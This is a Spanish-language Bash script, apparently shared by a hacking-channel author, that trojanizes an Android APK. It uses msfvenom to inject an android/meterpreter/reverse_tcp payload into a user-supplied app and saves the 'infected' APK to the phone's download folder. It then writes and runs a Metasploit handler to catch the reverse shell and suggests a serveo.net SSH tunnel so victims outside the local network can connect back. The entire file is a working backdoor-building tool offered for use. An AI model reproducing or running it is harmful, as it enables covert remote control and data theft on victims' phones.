#!/bin/bash

N='\033[1;30m'
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
M='\033[1;35m'
C='\033[1;36m'
W='\033[0m'

setterm --foreground cyan
figlet -f rebel.tlf EMBED
echo -e "$Y [!] este script fue creado por el krac"
echo -e "$N [!] mi telegram $Y:$B https://t.me/Hackeaconelkrac"
echo -e "$N [!] mi canal $Y:$B https://www.youtube.com/channel/UCw7b5atl0-ucJlS7A7qm8IA"
echo ""
printf  "$G(1) $Y Ruta de la apk $G>> "
read original
echo ""
sleep 1
printf  "$G(2) $Y escribe un LHOST para tu .apk $G>> "
read lhost
echo ""
sleep 1
printf  "$G(3) $Y escribe un LPORT para tu .apk $G>> "
read lport
echo ""
sleep 1
printf  "$G(4) $Y escribe un nuevo nombre para tu .apk $G>> "
read nueva
echo ""


sleep 1
clear
N='\033[1;30m'
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
M='\033[1;35m'
C='\033[1;36m'
W='\033[0m'


setterm --foreground cyan
figlet -f rebel.tlf EMBED
echo -e "$Y [!] este script fue creado por el krac"
echo -e "$N [!] mi telegram $Y:$B https://t.me/Hackeaconelkrac"
echo -e "$N [!] mi canal $Y:$B https://www.youtube.com/channel/UCw7b5atl0-ucJlS7A7qm8IA"
sleep 2
echo ""
printf " tu lhost = $Y"
 hostname -I
printf  "$G(2) $Y escribe tu LHOST $G>> "
read LHOST
sleep 1
echo ""
printf  "$G(2) $Y escribe un LPORT de 4 numeros $G>> "
read LPORT

echo "use exploit/multi/handler" >> $PWD/embed-krac/$nueva.rc
echo "set payload android/meterpreter/reverse_tcp" >> $PWD/embed-krac/$nueva.rc
echo "set LHOST $LHOST" >> $PWD/embed-krac/$nueva.rc
echo "set LPORT $LPORT" >> $PWD/embed-krac/$nueva.rc
echo "run" >> $PWD/embed-krac/$nueva.rc

setterm --foreground cyan
echo " ESPERA UN MOMENTO SE ESTA INFECTANDO TU APK"
msfvenom -x $original -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/download/$nueva


sleep 1
clear
N='\033[1;30m'
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
M='\033[1;35m'
C='\033[1;36m'
W='\033[0m'
setterm --foreground cyan
figlet -f rebel.tlf EMBED
setterm --foreground yellow
echo -e "$Y [!] este script fue creado por el krac"
echo -e "$N [!] mi telegram $Y:$B https://t.me/Hackeaconelkrac"
echo -e "$N [!] mi canal $Y:$B https://www.youtube.com/channel/UCw7b5atl0-ucJlS7A7qm8IA"
echo ""
sleep 2
echo -e  "  $G[!]$Y TU APK INFECTADA SE GUARDO EN LA CARPETA DOWNLOAD DE TU MEMORIA INTERNA $G[!]"
echo ""
echo " datos de tu apk. "
echo -e "$N LHOST$Y= $B$lhost $N LPORT$Y= $B$lport $N NOMBRE$Y= $B$nueva"
echo ""
echo " copia y pega esto en otra ventana  para ejecutar serveo.net "
echo -e  "       $G(  ssh -R $lport:$LHOST:$LPORT serveo.net  ) "
echo ""
setterm --foreground cyan
echo "[*] ESPERA UN MOMENTO METASPLOIT SE ESTA EJECUTANDO EN MODO ESCUCHA"
setterm --foreground yellow
msfconsole -q -r $PWD/embed-krac/$nueva.rc
